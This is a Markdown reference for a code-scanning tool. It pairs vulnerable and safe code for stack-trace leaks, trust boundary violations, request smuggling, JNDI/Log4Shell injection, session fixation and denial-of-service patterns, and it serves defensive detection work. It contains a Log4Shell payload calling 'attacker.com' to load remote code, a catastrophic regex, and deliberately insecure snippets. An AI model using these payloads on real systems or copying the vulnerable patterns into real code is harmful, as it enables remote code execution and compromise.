# Additional Vulnerability Classes Reference

These patterns are derived from the llm-sast-scanner skill to enhance coverage.

---

## 1. Stack Trace Leaking / Information Disclosure (CWE-209)

### Description
Stack traces expose internal implementation details including file paths, class names, method names, framework versions, and potentially sensitive data. When leaked to users, this information helps attackers map the codebase and identify exploitable components.

### Detection Patterns

#### Python
```python
# VULNERABLE: Stack trace returned to client
@app.errorhandler(Exception)
def handle_error(e):
    return str(e)                        # Error message leaked
    return traceback.format_exc()        # Full stack trace leaked
    return {"error": repr(e)}            # Detailed error leaked

# VULNERABLE: Debug mode in production
app.run(debug=True)                      # Flask debug with interactive debugger
DEBUG = True                             # Django debug mode

# VULNERABLE: Exception details in response
except Exception as e:
    return jsonify({"error": str(e), "trace": traceback.format_exc()})
```

#### JavaScript/Node.js
```javascript
// VULNERABLE: Stack trace in response
app.use((err, req, res, next) => {
    res.json({ error: err.stack });      // Full stack leaked
    res.json({ error: err.message });    // Error message leaked
    res.send(err.toString());            // Error details leaked
    res.json(err);                       // Entire error object
});

// VULNERABLE: Unhandled errors expose stack
process.on('uncaughtException', (err) => {
    res.status(500).send(err.stack);
});
```

#### Java
```java
// VULNERABLE: Exception printed to response
catch (Exception e) {
    response.getWriter().println(e.getMessage());
    response.getWriter().println(e.getStackTrace());
    e.printStackTrace(response.getWriter());
}

// VULNERABLE: Spring error details
@ExceptionHandler(Exception.class)
public ResponseEntity<?> handleError(Exception e) {
    return ResponseEntity.status(500).body(e.getMessage());
}
```

#### PHP
```php
// VULNERABLE: Display errors enabled
error_reporting(E_ALL);
ini_set('display_errors', 1);

// VULNERABLE: Exception details output
catch (Exception $e) {
    echo $e->getMessage();
    echo $e->getTraceAsString();
    die($e);
}
```

### Safe Patterns
```python
# SAFE: Generic error message
@app.errorhandler(Exception)
def handle_error(e):
    app.logger.error(f"Error: {e}", exc_info=True)  # Log internally
    return {"error": "An internal error occurred"}, 500  # Generic to user
```

---

## 2. Trust Boundary Violation (CWE-501)

### Description
Occurs when untrusted data from HTTP requests is stored directly in trusted session storage without validation, allowing attackers to manipulate session-bound data.

### Detection Patterns

#### Java Servlet
```java
// VULNERABLE: Request param stored in session
HttpSession session = request.getSession();
session.setAttribute("role", request.getParameter("role"));      // VULN
session.setAttribute("userId", request.getParameter("id"));      // VULN
session.setAttribute("prefs", request.getHeader("X-User-Prefs")); // VULN

// VULNERABLE: Cookie value in session
Cookie[] cookies = request.getCookies();
session.setAttribute("theme", cookies[0].getValue());            // VULN
```

### Safe Patterns
```java
// SAFE: Server-generated value
String role = roleService.getRoleForUser(authenticatedUser);
session.setAttribute("role", role);

// SAFE: Validated against whitelist
String theme = request.getParameter("theme");
if (ALLOWED_THEMES.contains(theme)) {
    session.setAttribute("theme", theme);
}
```

---

## 3. HTTP Request Smuggling (CWE-444)

### Description
Exploits differences in how frontend proxies and backend servers parse HTTP request boundaries (Content-Length vs Transfer-Encoding), allowing attackers to smuggle requests.

### Detection Patterns
```nginx
# RISK: Proxy to backend without TE normalization
location / {
    proxy_pass http://backend:8080;
    # Missing: proxy_http_version 1.1;
    # Missing: proxy_set_header Connection "";
}
```

```python
# RISK: Flask/Gunicorn behind nginx
app.run(host='0.0.0.0')  # Behind proxy without CL/TE handling

# RISK: Gunicorn < 20.x with async workers
# gunicorn --worker-class gevent app:app
```

```javascript
// RISK: Node.js behind proxy
// Node < 14.5.0 doesn't reject CL + TE together
http.createServer((req, res) => { ... });
```

### Mitigation
```nginx
# SAFE: Nginx config
proxy_http_version 1.1;
proxy_set_header Connection "";
proxy_set_header Transfer-Encoding "";
```

---

## 4. JNDI Injection / Log4Shell (CWE-917)

### Description
User input reaches JNDI lookup calls, allowing attackers to load remote Java objects via LDAP/RMI, resulting in RCE.

### Detection Patterns

#### Direct JNDI Lookup
```java
// VULNERABLE: User input in JNDI lookup
String ds = request.getParameter("datasource");
Context ctx = new InitialContext();
DataSource dataSource = (DataSource) ctx.lookup(ds);  // VULN: RCE possible
// Attacker: ds=ldap://attacker.com/Exploit

// VULNERABLE: JndiTemplate with user input
JndiTemplate jndiTemplate = new JndiTemplate();
Object resource = jndiTemplate.lookup(request.getParameter("resource"));
```

#### Log4Shell (CVE-2021-44228)
```java
// VULNERABLE: Log4j2 < 2.15.0 logging user input
import org.apache.logging.log4j.Logger;
Logger logger = LogManager.getLogger();

logger.info("User-Agent: {}", request.getHeader("User-Agent"));  // VULN
logger.error("Login failed: " + request.getParameter("username")); // VULN
// Attacker sends: User-Agent: ${jndi:ldap://attacker.com/Exploit}
```

#### Maven Dependency Check
```xml
<!-- VULNERABLE: Log4j < 2.17.0 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>  <!-- CVE-2021-44228 -->
</dependency>
```

### Safe Patterns
```java
// SAFE: Hardcoded JNDI name
ctx.lookup("java:comp/env/jdbc/MyDataSource");

// SAFE: Log4j >= 2.17.0 or mitigations
// JVM: -Dlog4j2.formatMsgNoLookups=true
// ENV: LOG4J_FORMAT_MSG_NO_LOOKUPS=true
```

---

## 5. Session Fixation (CWE-384)

### Description
Application doesn't regenerate session ID after authentication, allowing attackers to hijack sessions by fixing a known session ID before login.

### Detection Patterns

#### Java
```java
// VULNERABLE: No session regeneration on login
public void doLogin(HttpServletRequest request) {
    HttpSession session = request.getSession();
    if (authenticate(user, pass)) {
        session.setAttribute("user", user);  // VULN: Same session ID
        // Missing: session.invalidate() or request.changeSessionId()
    }
}

// VULNERABLE: Spring Security
http.sessionManagement()
    .sessionFixation().none();  // VULN: Explicitly disabled
```

#### PHP
```php
// VULNERABLE: No session regeneration
session_start();
if (authenticate($user, $pass)) {
    $_SESSION['user'] = $user;  // VULN: Same session ID
    // Missing: session_regenerate_id(true);
}
```

#### Node.js
```javascript
// VULNERABLE: No session regeneration
app.post('/login', (req, res) => {
    if (authenticate(req.body)) {
        req.session.user = req.body.username;  // VULN
        // Missing: req.session.regenerate()
    }
});
```

### Safe Patterns
```java
// SAFE: Java Servlet
HttpSession oldSession = request.getSession(false);
if (oldSession != null) oldSession.invalidate();
HttpSession newSession = request.getSession(true);
newSession.setAttribute("user", user);

// SAFE: Servlet 3.1+
request.changeSessionId();

// SAFE: Spring Security (default)
http.sessionManagement().sessionFixation().migrateSession();
```

```php
// SAFE: PHP
session_regenerate_id(true);
$_SESSION['user'] = $user;
```

---

## 6. Denial of Service Patterns

### ReDoS (Regular Expression DoS) - CWE-1333
```python
# VULNERABLE: User-controlled regex
pattern = request.args.get('filter')
re.search(pattern, subject)  # Attacker can supply catastrophic regex

# VULNERABLE: Catastrophic backtracking
re.match(r'^(a+)+$', user_input)           # Exponential
re.match(r'([a-z]+)*@[a-z]+\.com', input)  # Nested quantifiers
```

```java
// VULNERABLE: User-supplied pattern
String pattern = request.getParameter("regex");
Pattern.compile(pattern).matcher(data).matches();
```

### XML Bomb / Billion Laughs - CWE-776
```java
// VULNERABLE: No entity expansion limits
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// Missing: dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
DocumentBuilder db = dbf.newDocumentBuilder();
db.parse(userXmlStream);  // Billion laughs → memory exhaustion
```

### Zip Bomb - CWE-409
```java
// VULNERABLE: No size limit on extraction
ZipInputStream zis = new ZipInputStream(input);
ZipEntry entry;
while ((entry = zis.getNextEntry()) != null) {
    // No check on entry.getSize() or total extracted bytes
    while (zis.read(buffer) != -1) { /* write */ }
}
```

```python
# VULNERABLE: Tarfile extraction without limits
import tarfile
with tarfile.open(user_file) as tar:
    tar.extractall(path=extract_dir)  # Decompression bomb possible
```

### Unbounded Operations
```java
// VULNERABLE: No pagination
@GetMapping("/users")
public List<User> getAll() {
    return userRepository.findAll();  // 10M rows → OOM
}

// VULNERABLE: User-controlled page size
int size = Integer.parseInt(request.getParameter("size"));
// Missing: size = Math.min(size, MAX_PAGE_SIZE);
```

---

## 7. Additional Patterns from llm-sast-scanner

### HTTP Method Tampering
```
X-HTTP-Method-Override: DELETE
X-Method-Override: PUT
```
Check if application respects override headers without proper authorization.

### Verification Code Abuse
- OTP/2FA codes without rate limiting
- Codes without expiration
- Predictable code generation

### Default Credentials
```java
// VULNERABLE: Hardcoded defaults
private static final String DEFAULT_PASSWORD = "admin123";
if (password.equals(DEFAULT_PASSWORD)) { /* grant access */ }
```

### CVE Pattern Detection
- Check dependency versions against known CVEs
- Log4j, Spring4Shell, Struts2 patterns
